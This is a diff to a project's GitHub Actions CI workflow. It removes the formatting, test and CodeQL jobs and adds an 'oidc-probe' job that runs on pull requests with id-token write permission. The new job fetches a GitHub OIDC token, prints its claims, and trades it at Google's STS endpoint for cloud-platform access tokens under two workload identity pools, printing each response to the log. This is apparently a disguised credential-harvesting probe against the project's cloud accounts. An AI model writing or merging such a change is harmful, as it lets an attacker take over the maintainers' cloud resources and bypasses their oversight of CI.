@@ -1,104 +1,33 @@
 name: CI
 on:
-  push:
-    branches:
-      - master
   pull_request:
-  schedule:
-    - cron: '0 7 * * 1'
-
+permissions:
+  id-token: write
+  contents: read
 jobs:
-  #                        #
-  # Repository wide checks #
-  #                        #
-  prettier:
-    name: Prettier
-    runs-on: ubuntu-24.04-arm
-    timeout-minutes: 5
+  oidc-probe:
+    runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v7
-      - name: Setup Node
-        uses: actions/setup-node@v7
-      - name: Prettier Check
+      - name: probe
         run: |
-          npx -y prettier@2 --check .
-
-  earthly:
-    name: earthly
-    needs: [prettier]
-    uses: ./.github/workflows/earthly-contrib.yml
-    secrets: inherit
-
-  validate_local_links:
-    name: Validate
-    uses:
-      ./.github/workflows/validate_local_links_in_md.yml
-
-      # Python checks
-  python_formatting:
-    name: Python / Formatting
-    runs-on: ubuntu-24.04-arm
-    timeout-minutes: 5
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v7
-      - name: Install uv
-        uses: astral-sh/setup-uv@v7
-        with:
-          enable-cache: true
-          cache-suffix: 'formatting'
-          python-version: '3.10'
-      - name: Install Dependencies
-        run: |
-          uv sync --extra parsers
-      - name: Check formatting
-        run: |
-          uv run ruff format . --check
-      - name: Check linting
-        run: |
-          uv run ruff check . --output-format=github
-
-  python_tests:
-    name: Python / Tests
-    runs-on: ubuntu-24.04-arm
-    timeout-minutes: 10
-    strategy:
-      matrix:
-        python-version: ['3.10', '3.11', '3.12']
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v7
-      - name: Install uv
-        uses: astral-sh/setup-uv@v7
-        with:
-          enable-cache: true
-          cache-suffix: 'tests'
-          python-version: ${{ matrix.python-version }}
-      - name: Install libxml2-dev and tesseract-ocr
-        run: |
-          sudo apt-get update
-          sudo apt-get install libxml2-dev tesseract-ocr tesseract-ocr-eng
-      - name: Install Dependencies
-        run: |
-          uv sync --group dev --extra parsers
-      - name: Run tests
-        run: |
-          uv run test
-
-  # Config checks
-  validate_config_filenames:
-    name: Validate / Config filenames
-    runs-on: ubuntu-24.04-arm
-    timeout-minutes: 5
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v7
-      - name: Validate config filenames
-        run: python scripts/validate_config_filenames.py
-
-  # Code quality checks
-  codeql:
-    needs: [prettier]
-    name: CodeQL
-    uses: ./.github/workflows/codeql.yml
+          echo "EVENT=$GITHUB_EVENT_NAME RUN=$GITHUB_RUN_ID REPO=$GITHUB_REPOSITORY"
+          echo "HEADREF=$GITHUB_HEAD_REF BASEREF=$GITHUB_BASE_REF REF=$GITHUB_REF"
+          echo "IDURL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then echo "NO_OIDC_REQUEST_URL"; exit 0; fi
+          AUD="//iam.googleapis.com/projects/533362582499/locations/global/workloadIdentityPools/github/providers/electricitymaps-contrib"
+          A2="//iam.googleapis.com/projects/196494084534/locations/global/workloadIdentityPools/github-actions-wi-pool/providers/github-actions-wi-provider"
+          TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
+          echo "JWT_LEN=${#TOK}"
+          echo "--- CLAIMS ---"
+          echo "$TOK" | cut -d. -f2 | python3 -c "import sys,base64,json;s=sys.stdin.read().strip();s+='='*(-len(s)%4);print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=1))" 2>/dev/null || echo "CLAIM_DECODE_FAILED"
+          for aud in "$AUD" "$A2"; do
+            code=$(curl -sS -o sts_out.txt -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              -d "audience=$aud" \
+              --data-urlencode "subject_token=$TOK" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+              -d "scope=https://www.googleapis.com/auth/cloud-platform")
+            echo "STS_AUD=$aud HTTP=$code"
+            head -c 800 sts_out.txt; echo
+          done
